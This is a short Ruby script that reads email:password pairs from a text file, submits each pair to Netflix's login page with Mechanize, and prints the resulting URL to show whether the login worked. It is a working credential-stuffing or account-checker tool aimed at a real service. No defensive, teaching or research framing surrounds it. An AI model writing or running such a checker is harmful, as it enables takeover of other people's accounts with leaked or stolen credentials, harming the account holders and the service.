require "nokogiri"
require "mechanize"

File.open(File.dirname(__FILE__) + "/account.txt") {|f|

  f.each {|line|

	line.chomp!
	account = line.split(/[:]/)

print ("\n\n\n\n")
    p ("EMAIL:　　  " + account[0])
    p ("PASSWORD:　" + account[1])

		email = account[0]
		pass = account[1]

agent = Mechanize::new
 
agent.get('https://www.netflix.com/login')
 

agent.page.form_with(){|form|
  form.field_with(:name => 'email').value = email
  form.field_with(:name => 'password').value = pass
  form.click_button
}


print ("\n")
print agent.page.uri

agent.get('https://www.netflix.com/SignOut')

  }
}
